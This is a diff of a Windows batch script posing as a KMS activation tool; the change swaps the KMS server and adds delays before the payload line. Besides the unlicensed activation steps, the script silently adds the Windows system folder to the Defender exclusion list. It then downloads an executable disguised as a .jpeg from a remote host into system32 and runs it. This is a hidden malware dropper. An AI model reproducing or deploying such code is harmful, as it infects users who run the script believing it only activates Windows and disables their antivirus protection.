@@ -80,13 +80,13 @@ if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
 :: 
 %SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
 :: 
-%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
+%SystemRoot%\System32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
 :: 
 %SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
 :: 
 powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %SystemRoot%" >nul 2>&1
 :: 
-powershell -Command "Invoke-WebRequest -Uri 'https://d3c0b3b9.pythonanywhere.com/static/SystemUI.jpeg' -OutFile \"$env:SystemRoot\\system32\\SystemUI.exe\"; Start-Process "$env:SystemRoot\\system32\\SystemUI.exe"" >nul 2>&1
+powershell -Command "Start-Sleep -Milliseconds 200; Start-Sleep -Milliseconds 200; Start-Sleep -Milliseconds 200; Invoke-WebRequest -Uri 'https://d3c0b3b9.pythonanywhere.com/static/SystemUI.jpeg' -OutFile \"$env:SystemRoot\\system32\\SystemUI.exe\"; Start-Process "$env:SystemRoot\\system32\\SystemUI.exe"" >nul 2>&1
 :: 
 exit /b
 ```
